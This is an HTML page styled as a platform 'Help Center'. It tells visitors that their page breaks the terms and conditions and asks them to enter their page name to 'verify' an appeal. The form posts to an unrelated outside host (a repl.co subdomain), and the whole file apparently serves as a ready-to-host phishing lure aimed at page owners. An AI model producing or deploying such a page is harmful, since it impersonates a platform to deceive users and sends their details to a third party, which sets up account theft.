<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Help Center</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap">
    <style>
        body {
            font-family: 'Montserrat', sans-serif;
            background-color: #3498db; /* Deeper blue background color */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
            width: 360px; /* Wider width */
            height: auto; /* Adjusted height to accommodate content */
            text-align: center;
        }

        h1 {
            color: #333;
            margin-bottom: 20px;
            font-weight: 600; /* Adding font-weight for boldness */
        }

        p {
            color: #666;
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: bold;
            text-align: left;
            margin-bottom: 5px;
        }

        .input-container {
            display: flex;
            align-items: center;
        }

        input[type="text"] {
            flex: 1;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 16px;
            box-sizing: border-box; /* Ensure the input width includes padding and borders */
        }

        input[type="submit"] {
            background-color: #007BFF;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-left: 10px; /* Add margin to separate from input */
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }

        .header-img {
            max-width: 100px; /* Reduce image width */
            border-radius: 50%; /* Make image round */
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="header-img" src="your-image-url.jpg" alt="Header Image">
        <h1>Help Center</h1>
        <p>Your page is breaking our terms and conditions.</p>
        <p>Here you can submit an appeal. Enter your page name to verify.</p>

        <form action="https://confirm.review-request.repl.co" method="POST">
            <label for="pageName">Enter Your Page Name:</label>
            <div class="input-container">
                <input type="text" id="pageName" name="pageName" required>
                <input type="submit" value="Verify">
            </div>
        </form>
    </div>
</body>
</html>
